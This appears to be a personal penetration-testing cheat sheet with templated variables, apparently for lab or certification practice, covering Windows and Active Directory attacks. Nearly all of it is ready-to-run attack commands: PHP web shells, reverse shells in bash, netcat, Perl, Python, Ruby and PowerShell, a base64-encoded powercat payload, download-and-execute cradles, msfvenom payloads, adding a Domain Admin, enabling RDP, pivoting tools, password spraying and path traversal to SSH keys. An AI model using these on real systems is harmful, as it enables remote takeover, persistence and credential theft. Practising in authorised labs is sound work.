## WINDOWS ENUM
- whoami /priv
- systeminfo(OS NAME, OS VERSION)
- username:username
- winPEAS
	- Check putty session
   	- Modifiable services/executables
- Check files
  	- Get-ChildItem 



## Responder: when there's a url input section 
```bash
sudo responder -I tun0

http://192.168.45.176/share/rev.sh
file://192.168.45.176/share/rev.sh
```


## Shells & stuff
https://www.revshells.com/

```bash

# Get-NTLM from password
python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<% tp.frontmatter["PASSWORD"] %>".encode("utf-16le")).digest())'

powershell "IEX(New-Object Net.Webclient).downloadString('http://<% tp.frontmatter["LHOST"] %>:<LPORT>/Invoke-PowerShellTcp.ps1')"


# php cmd 

<?php $cmd=$_GET['cmd']; system($cmd);?>
<?php echo shell_exec("wget [http://IP/reverse.sh](http://IP/reverse.sh) -O /tmp/reverseshell.sh");?>
<?php echo shell_exec("chmod 777 /tmp/reverseshell.sh");?>
<?php echo shell_exec("/bin/bash /tmp/reverseshell.sh");?>
<?php echo system($_GET['cmd']); ?>


<pre>
<?php
	system([$_GET['cmd']]);
?>
</pre>


#enabling RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0**

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"


# ConPtyShell
https://github.com/antonioCoco/ConPtyShell
stty raw -echo

certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Others/ConPtyShell/Invoke-ConPtyShell.ps1
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Others/ConPtyShell/ConPtyShell.exe


. ./Invoke-ConPtyShell.ps1
# exe
stty raw -echo; (stty size; cat) | nc -lvnp 3001
Invoke-ConPtyShell <% tp.frontmatter["LHOST"] %> 3001
./ConPtyShell.exe <% tp.frontmatter["LHOST"] %> 3001

#manual upgrade
Invoke-ConPtyShell -Upgrade -Rows 23 -Cols 115


# Execute Command as another user
PS C:\> $SecurePassword = ConvertTo-SecureString '<% tp.frontmatter["PASSWORD"] %>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<% tp.frontmatter["USERNAME"] %>', $SecurePassword)
PS C:\> $Session = New-PSSession -Credential $Cred
PS C:\> Invoke-Command -Session $session -scriptblock { whoami }

or
$username = '<% tp.frontmatter["USERNAME"] %>'
$password = '<% tp.frontmatter["PASSWORD"] %>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process powershell.exe -Credential $credential

powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"


# Add new Domain Admin
$PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <% tp.frontmatter["PASSWORD"] %>
New-ADUser -Name "<% tp.frontmatter["USERNAME"] %>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
Add-ADGroupMember -Identity "Domain Admins" -Member <% tp.frontmatter["USERNAME"] %>

#Execute Command in User Context
$pass = ConvertTo-SecureString "<% tp.frontmatter["PASSWORD"] %>" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("<% tp.frontmatter["DOMAIN"] %>\<% tp.frontmatter["USERNAME"] %>", $pass)
Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}

#Execute Scripts with Creds (Reverse Shell)
$pass = ConvertTo-SecureString "<% tp.frontmatter["PASSWORD"] %>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<% tp.frontmatter["DOMAIN"] %>\<% tp.frontmatter["USERNAME"] %>", $pass)
Invoke-Command -Computer <% tp.frontmatter["RHOST"] %> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<% tp.frontmatter["LHOST"] %>/<FILE>.ps1') } -Credential $cred


# Search For Important Files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.ini,*.log,*.txt -File -Recurse -ErrorAction SilentlyContinue
```


## Reverse shell
```bash

#bash reverse shell

bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1'
#URLENCODED (bash -c 'bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1')
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1"' | base64

# curl Reverse shell
curl --header "Content-Type: application/json" --request POST http://<% tp.frontmatter["RHOST"] %>:<RPORT>/upload --data '{"auth": {"name": "<% tp.frontmatter["USERNAME"] %>", "password": "<% tp.frontmatter["PASSWORD"] %>"}, "filename" : "& echo "bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1"|base64 -d|bash"}'

#mkfifo Reverse shell
mkfifo /tmp/shell; nc <% tp.frontmatter["LHOST"] %> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell

#netcat reverse shell
nc -e /bin/sh <% tp.frontmatter["LHOST"] %> <LPORT>

#perl reverse shell
perl -e 'use Socket;$i="<% tp.frontmatter["LHOST"] %>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#PHP reverse shell
php -r '$sock=fsockopen("<% tp.frontmatter["LHOST"] %>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

#msfvenom 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f exe -o reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=4444 -f dll -o reverse.dll

#Powershell Reverse shell
$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.frontmatter["LHOST"] %>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


#Create powershell reverse shell on kali linux
kali@kali:~$ pwsh

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText

$powershell -enc $EncodedText

#python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'

#ruby reverse shell
ruby -rsocket -e'f=TCPSocket.open("<% tp.frontmatter["LHOST"] %>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# nishang
cd path/to/nishang/Shells/
cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress <% tp.frontmatter["LHOST"] %> -Port <LPORT>

```

## ligolo-ng
```bash
## on kali
$ sudo ip tuntap add user [your_username] mode tun ligolo
$ sudo ip link set ligolo up
$ ./proxy -selfcert
$ sudo ip route add 10.10.85.0/24 dev ligolo
$ session
$ start
$ test with crackmapexec smb 10.10.85.0/24
$ listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
$ listener_list

on windows
.\agent.exe -connect 192.168.45.176:11601 -ignore-cert

```



## File Sharing
```bash

## certutil
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/reverse.exe
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Linux/linpeas.sh
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/mimikatz/mimikatz.exe
certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/exe/winPEASany.exe

c:/users/public/

# smbserver
impacket-smbserver test /home/rachit -smb2support -user joe -password joe
net use m: \\<% tp.frontmatter["LHOST"] %>\test /user:joe joe /persistent:yes
copy * \\<% tp.frontmatter["LHOST"] %>\test
smbserver.py -smb2support test .

# powershell
iwr -uri <% tp.frontmatter["LHOST"] %>:8000/<FILE> -Outfile <FILE>
IEX(IWR http://<% tp.frontmatter["LHOST"] %>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<% tp.frontmatter["LHOST"] %>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)

# wget
wget http://<% tp.frontmatter["LHOST"] %>/<FILE>
wget -r --no-parent http://<% tp.frontmatter["LHOST"] %>/<FILE>
wget -m http://<% tp.frontmatter["LHOST"] %>/<FILE>

#c url
curl http://<% tp.frontmatter["LHOST"] %>/<FILE> > <OUTPUT_FILE>

#MSF
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -f exe -o <FILE>.exe

#MSF reverse in c (-e: encoder, -b: bad characters)
msfvenom -p windows/shell_reverse_tcp -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LHOST=192.168.49.100 LPORT=80 -e x86/alpha_mixed -f c

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <% tp.frontmatter["LHOST"] %>
LHOST => <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > set LPORT <LPORT>
LPORT => <LPORT>
msf6 exploit(multi/handler) > run

.\<FILE>.exe

meterpreter > download *
```



## Tools
```bash
# nmapAutomator
./nmapAutomator.sh -H  <% tp.frontmatter["RHOST"] %> -T All

#nmap
sudo nmap -A -T4 -sC -sV -p- <% tp.frontmatter["RHOST"] %>
sudo nmap -sV -sU <% tp.frontmatter["RHOST"] %>
## scan top ports(UDP)
sudo nmap -sU --top-ports 20 -sV 192.168.195.149
sudo nmap -A -T4 -sC -sV --script vuln <% tp.frontmatter["RHOST"] %>
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <% tp.frontmatter["RHOST"] %>
sudo nmap -sC -sV -p- --scan-delay 5s <% tp.frontmatter["RHOST"] %>
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <% tp.frontmatter["RHOST"] %>
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb

## curl
```bash
GET Request
curl -i http://192.168.50.16:5002/users/v1/admin/password

POST Request
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

PUT Request
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

```


# evil-winrm
```bash
evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -p '<% tp.frontmatter["PASSWORD"] %>'
evil-winrm -i <% tp.frontmatter["RHOST"] %> -u '<% tp.frontmatter["USERNAME"] %>' -H ''
```

# xfreerdp
```bash
xfreerdp /v:<% tp.frontmatter["RHOST"] %> /u:<% tp.frontmatter["USERNAME"] %> /p:<% tp.frontmatter["PASSWORD"] %> /dynamic-resolution +clipboard
xfreerdp /v:<% tp.frontmatter["RHOST"] %> /u:<% tp.frontmatter["USERNAME"] %> /d:<% tp.frontmatter["DOMAIN"] %> /pth:'<HASH>' /dynamic-resolution +clipboard
```

# smbclient
```bash
smbclient -L \\<% tp.frontmatter["RHOST"] %>\ -N
smbclient -L //<% tp.frontmatter["RHOST"] %>/ -N
smbclient -L ////<% tp.frontmatter["RHOST"] %>/ -N
smbclient -U "<% tp.frontmatter["USERNAME"] %>" -L \\\\<% tp.frontmatter["RHOST"] %>\\
smbclient -L //<% tp.frontmatter["RHOST"] %>// -U <% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>
smbclient //<% tp.frontmatter["RHOST"] %>/SYSVOL -U <% tp.frontmatter["USERNAME"] %>%<% tp.frontmatter["PASSWORD"] %>
smbclient "\\\\<% tp.frontmatter["RHOST"] %>\<SHARE>"
smbclient \\\\<% tp.frontmatter["RHOST"] %>\\<SHARE> -U '<% tp.frontmatter["USERNAME"] %>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //<% tp.frontmatter["RHOST"] %>/<SHARE>
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
mount.cifs //<% tp.frontmatter["RHOST"] %>/<SHARE> /mnt/remote
guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v

mask""
recurse ON
prompt OFF
mget *
```

# snmpwalk 
```bash
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %>
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> .1
snmpwalk -v2c -c public <% tp.frontmatter["RHOST"] %> nsExtendObjects
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <% tp.frontmatter["RHOST"] %> 1.3.6.1.2.1.25.6.3.1.2

1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

# Dont forget to use
```bash
--local-auth
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --pass-pol
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --shares
crackmapexec smb <% tp.frontmatter["RHOST"] %> -u "" -p "" --shares -M spider_plus
crackmapexec ssh <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
crackmapexec ftp <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>" --continue-on-success
crackmapexec mssql <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p "<% tp.frontmatter["PASSWORD"] %>"
crackmapexec mssql 10.10.85.148 -u sql_svc -p Dolphin1 -d oscp.exam --get-file "C:\TEMP\SAM" SAM
crackmapexec winrm <% tp.frontmatter["RHOST"] %> -u "<% tp.frontmatter["USERNAME"] %>" -p '<% tp.frontmatter["PASSWORD"] %>' -d <% tp.frontmatter["DOMAIN"] %>  --continue-on-success
crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAME"] %>" -H '' -d <% tp.frontmatter["DOMAIN"] %> --continue-on-success
```

# Kerbrute
```bash
./kerbrute userenum -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES>
./kerbrute passwordspray -d <% tp.frontmatter["DOMAIN"] %> --dc <% tp.frontmatter["DOMAIN"] %> /PATH/TO/FILE/<USERNAMES> <% tp.frontmatter["PASSWORD"] %>
```


#ldap
```bash
ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'
ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

ldapsearch -x -w <% tp.frontmatter["PASSWORD"] %>
ldapsearch -x -H ldap://<% tp.frontmatter["RHOST"] %> -s base namingcontexts
ldapsearch -x -b "dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" "*" -H ldap://<% tp.frontmatter["RHOST"] %> | awk '/dn: / {print $2}'
ldapsearch -x -D "cn=admin,dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" -s sub "cn=*" -H ldap://<% tp.frontmatter["RHOST"] %> | awk '/uid: /{print $2}' | nl
ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
ldapsearch -x -H ldap://<% tp.frontmatter["RHOST"] %> -D "<% tp.frontmatter["USERNAME"] %>"  -b "dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -H ldap://<% tp.frontmatter["DOMAIN"] %> -b "DC=<% tp.frontmatter["DOMAIN"] %>,DC=local" > <FILE>.txt

<examples>
ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
```

```bash
# Get computers
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --computers
# Get groups
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --groups
# Get users
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --da
# Get Domain Admins
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --da
# Get Privileged Users
python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --privileged-users
```

#powercat
```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<% tp.frontmatter["LHOST"] %>/powercat.ps1');powercat -c <% tp.frontmatter["LHOST"] %> -p <LPORT> -e cmd"
"powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AOAA1AC4AMQA0ADcAJwAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

#adpeas
```bash
Import-Module .\adPEAS.ps1
. .\adPEAS.ps1
Invoke-adPEAS
Invoke-adPEAS -Domain '<% tp.frontmatter["DOMAIN"] %>' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor
```

#### Certipy
```bash
certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["DOMAIN"] %> -p <% tp.frontmatter["PASSWORD"] %>
certipy find -dc-ip <% tp.frontmatter["PASSWORD"] %> -u <% tp.frontmatter["USERNAME"] %> -p <% tp.frontmatter["PASSWORD"] %> -vulnerable -stdout
```

#rpcclient
```bash
rpcclient -U "" <% tp.frontmatter["RHOST"] %>
```

# msfvenom && metasploit execution
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<% tp.frontmatter["LHOST"] %> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > set LPORT <% tp.frontmatter["LHOST"] %>
msf6 exploit(multi/handler) > run

.\exploit.exe
```

## Pivoting
```bash
#ligolo

certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/Ligolo/agent.exe

sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
 # LHOST machine
./proxy -selfcert
# RHOST machine
./agent -ignore-cert -connect <% tp.frontmatter["LHOST"] %>:11601
./agent.exe -ignore-cert -connect <% tp.frontmatter["LHOST"] %>:11601
#route
sudo ip route add x.x.x.x dev ligolo

help command
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:7777 --tcp


#chisel
#Run command on attacker machine
chisel server -p 8888 --reverse
#<socks>Run command on Web Server machine
 .  .\chisel.exe client <% tp.frontmatter["LHOST"] %>:8001 R:1080:socks
and edit the proxychains with the port that chisel provided

#When trying to connect to a local port
C:\\xampp\\htdocs>.\\chisel.exe client 192.168.45.176:8888 R:8090:localhost:80

```


## Protocols
```
# SSH
ssh user@<% tp.frontmatter["RHOST"] %> -oKexAlgorithms=+diffie-hellman-group1-sha1
ssh -i key.pem user@<% tp.frontmatter["RHOST"] %>

../../../../../../../../../home/<% tp.frontmatter["USERNAME"] %>/.ssh/id_rsa

hydra -v -V -u -L users -P password -t 1 -u <% tp.frontmatter["RHOST"] %>  ssh

#FTP
wget-m --no-passive ftp://<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@<% tp.frontmatter["LHOST"] %>
wget -r ftp://<% tp.frontmatter["USERNAME"] %>:<% tp.frontmatter["PASSWORD"] %>@example.com/remote/dir/

```

``
## Fuzzing/Bruteforcing
```bash

# common file extensions
txt,bak,php,html,js,asp,aspx

# common picture extensions
png,jpg,jpeg,gif,bmp

# feroxbuster
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  --url http://<% tp.frontmatter["RHOST"] %>/  -x php,aspx,jsp,pdf  -C 404,401,403 --output brute.txt

# Gobuster
### Directory Mode
gobuster dir -u http://<% tp.frontmatter["RHOST"] %>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Pattern matching(API)
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

# API Fuzzing
ffuf -u https://<% tp.frontmatter["RHOST"] %>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412

# File Extensions
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<% tp.frontmatter["RHOST"] %>/cd/ext/logs/FUZZ -e .log

# Searching for LFI
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<% tp.frontmatter["RHOST"] %>/admin../admin_staging/index.php?page=FUZZ -fs 15349

# WPScan
wpscan --url https://<% tp.frontmatter["RHOST"] %> --enumerate u,t,p
wpscan --url https://<% tp.frontmatter["RHOST"] %> --plugins-detection aggressive
wpscan --url https://<% tp.frontmatter["RHOST"] %> --disable-tls-checks
wpscan --url https://<% tp.frontmatter["RHOST"] %> --disable-tls-checks --enumerate u,t,p
